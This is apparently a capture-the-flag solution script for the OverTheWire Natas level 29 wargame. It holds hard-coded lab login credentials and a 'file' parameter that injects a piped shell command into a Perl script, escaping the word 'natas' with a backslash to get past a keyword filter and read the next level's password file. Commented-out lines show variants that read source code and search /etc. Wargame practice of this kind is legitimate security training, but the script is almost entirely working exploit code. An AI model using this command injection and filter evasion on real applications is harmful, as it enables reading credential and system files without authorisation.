#!/usr/bin/python

import requests

url = "http://natas29.natas.labs.overthewire.org/index.pl?"

auth = ("natas29", "airooCaiseiyee8he8xongien9euhe8b")

params = {
    # "file": "|cat $(find /etc/ -name '*atas30' 2&>/dev/null);"
    "file": '|cat /etc/n\\atas_webpass/n\\atas30;'
    # "file": "|cat index.pl;"
}

r = requests.get(url, auth=auth, params=params)

print(r.text)
print(r.url)